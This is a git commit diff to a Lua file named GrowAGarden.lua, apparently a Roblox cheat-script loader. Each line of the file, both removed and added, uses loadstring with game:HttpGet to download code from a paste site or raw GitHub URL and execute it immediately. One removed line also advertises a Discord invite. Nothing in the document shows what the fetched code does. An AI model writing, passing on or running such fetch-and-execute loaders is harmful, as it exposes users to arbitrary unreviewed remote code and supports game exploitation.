1af0dee2ec5317f01618a95eb8bdf662f5abe5a4
Zyferion-Scrpts <uzilia769@gmail.com>
2025-07-27 17:05:43 +0800

    Update GrowAGarden.lua

--- GrowAGarden.lua
+++ GrowAGarden.lua
@@ -1,2 +1,1 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/glkOoNFU9FalXS6w/raw", true))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+loadstring(game:HttpGet("https://pastefy.app/UBp1BKZN/raw"))()
